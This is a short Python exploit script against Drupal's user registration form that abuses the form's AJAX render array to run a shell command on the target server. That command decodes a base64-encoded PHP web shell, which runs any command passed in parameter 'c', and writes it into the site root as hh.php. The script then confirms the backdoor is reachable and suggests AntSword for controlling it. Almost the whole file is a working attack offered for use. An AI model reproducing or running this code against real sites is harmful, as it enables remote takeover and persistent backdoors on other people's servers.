#!/usr/bin/env
import sys
import requests

# This script creates a backdoor file in the root directory of the website.
# Backdoor: `<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }`.
# Backdoor Pass is `c`
# You can use the webshell management tool(example: AntSword) to connect to the backdoor.

target = input("Input target URL (example: http://example.com/): ")
cmd = 'echo "PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9" | base64 -d | tee hh.php'

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
proxies = {}
verify = True

url = target + "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
payload = {
    'form_id':'user_register_form',
    '_drupal_ajax':'1',
    'mail[#post_render][]':'exec',
    'mail[#type]':'markup',
    'mail[#markup]':cmd    # command
}

res = requests.post(url=url, data=payload, proxies=proxies, verify=verify)
check = requests.get(url=target+"hh.php")

if check.status_code !=200 :
    sys.exit("\nAttack failed")

sys.exit("\nThe attack was successful!\nCheck backdoor: "+target+"hh.php\nBackdoor key: c")